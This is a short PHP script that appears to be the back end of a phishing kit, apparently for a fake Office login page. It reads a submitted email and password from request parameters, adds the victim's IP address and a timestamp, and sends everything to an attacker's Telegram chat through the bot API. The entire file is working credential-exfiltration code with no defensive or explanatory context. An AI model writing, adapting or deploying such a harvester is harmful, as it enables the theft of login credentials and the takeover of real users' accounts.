<?php

	$log = $_GET['u'];
	$pass= $_GET['p'];
	$token = $_GET['makin'];
	$chat_id = $_GET['chatid'];
	$ip = getenv("REMOTE_ADDR");
	$date = date("D/M/d, Y g:i a");


	$message = "Email: $log%0APass: $pass%0AIP address: $ip%0ASubmitted on $date %0A--------Office---------";

$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message";

if(!empty($chat_id)){

	$opts = array(
  'http'=>array(
    'method'=>"GET",
    'header'=>"Accept-language: en\r\n" .
              "Cookie: foo=bar\r\n"
  )
);

$context = stream_context_create($opts);
$fp = fopen($url, 'r', false, $context);
fclose($fp);

}
else{
	http_response_code(403);
die('Forbidden');
}

?>
